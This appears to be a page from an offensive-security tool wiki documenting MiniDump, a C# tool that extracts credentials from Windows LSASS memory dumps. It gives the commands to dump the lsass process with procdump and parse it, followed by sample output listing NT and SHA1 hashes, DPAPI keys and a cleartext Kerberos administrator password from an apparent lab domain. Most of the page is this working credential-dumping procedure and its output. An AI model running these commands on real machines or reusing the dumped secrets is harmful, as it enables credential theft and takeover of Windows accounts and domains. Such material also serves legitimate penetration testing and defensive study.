---
title : "Minidump"
# pre : ' '
description : "C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps."
date : 2021-10-22T11:14:39+02:00
# hidden : true
# draft : true
weight : 190
tags : ['Windows', 'LSASS']
---

---

C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps.

Supported Credentials:

- Lsa
- Msv
- Kerberos
- WDigest
- SSP
- TsPkg
- Credman
- Dpapi
- CloudAP

## Installation

{{%resources fa_icon_class="far fa-file" pattern=".*(exe)"/%}}

## Usage

[Sysinternals - procdump]({{< ref "sysinternals" >}})

```plain
PS C:\> .\procdump64.exe (ps lsass).id data -ma
PS C:\> MiniDump.exe lsass.dmp
```

## Examples

```plain
PS C:\Users\johndo\Downloads> .\MiniDump.exe C:\temp\lsass.DMP
Dpapi failed: Object reference not set to an instance of an object.
=====================================================================
[*] LogonId:     0:56684667
[*] LogonType:   CachedInteractive
[*] Session:     1
[*] LogonTime:   2021-10-25 13:46:52
[*] UserName:    Administrator
[*] SID:         S-1-5-21-1182270690-2338034634-174722242-500
[*] LogonDomain: OFFSEC
[*] LogonServer: SRV2016
[*] Msv
    DomainName: OFFSEC
    UserName:   Administrator
    NT:      97f2592347d8fbe42be381726ff9ea83
    Sha1:    d0321e2e4e0712ba7b3f8c1998931312bf6a8b05
    Dpapi:   408853f35eebebe52bffa11b77478cca
[*] Kerberos
    DomainName: OFFSEC.NL
    UserName: Administrator
    Password: Welkom1234
=====================================================================
[*] LogonId:     0:55957391
[*] LogonType:   Interactive
[*] Session:     2
[*] LogonTime:   2021-10-25 13:45:17
[*] UserName:    DWM-2
[*] SID:         S-1-5-90-0-2
[*] LogonDomain: Window Manager
[*] Msv
    DomainName: OFFSEC
    UserName:   WIN10$
    NT:      b5fb60bc5eb9092f9f96b89fcf0fee45
    Sha1:    33bcd239a53d5650bebd83a4963630805ab24465
[*] Kerberos
    DomainName: offsec.nl
    UserName: WIN10$
    Password: 82 b5 45 75 ad 5b 36 d1 3e 3a cf 7b fb ea 0a ca 48 63 92 25 71 53 0b f4 2d f8 80 48 28 7f fc 96 43 5b 30 19 ba 4c 88 be 53 7b 7b 11 a9 d8 c1 23 88 e2 24 01 64 45 31 08 08 af c6 97 bb 88 6e 0f 86 05 dd 43 12 d2 81 f3 ab e1 c3 11 1e cc 42 13 d2 e4 24 fa 2f 8e 6f eb 02 70 2e d4 92 30 42 01 a9 bd f9 cc 34 63 b2 78 41 c2 f4 94 73 8a 24 9c 3d cf 1d cf d5 5a dc 8b 47 0a c6 20 62 f8 8f 70 2c 16 92 ed f6 0a 4e 59 fe d4 7d d2 94 77 11 8a 4c c2 ce 3e 45 d4 53 e4 e7 e5 96 23 99 03 29 5e 2d 85 76 66 59 39 cc 33 1a cc 7a ac e5 c9 36 1d f2 18 0a fe 8b e3 41 ae 4c bd 0c fc 1a 5b a6 1b f2 c8 00 b7 19 5c 28 90 10 4b 32 a5 38 e0 44 1d b2 72 db c9 e5 ad 86 0f 7c 34 d1 82 40 24 83 0f 2f 60 3c 28 78 dc ef 82 03 de 4a 13 33 62 c3 5f
    NT: B5FB60BC5EB9092F9F96B89FCF0FEE45
[...]
```

## URL List

- [Github.com - Minidump](https://github.com/cube0x0/MiniDump)
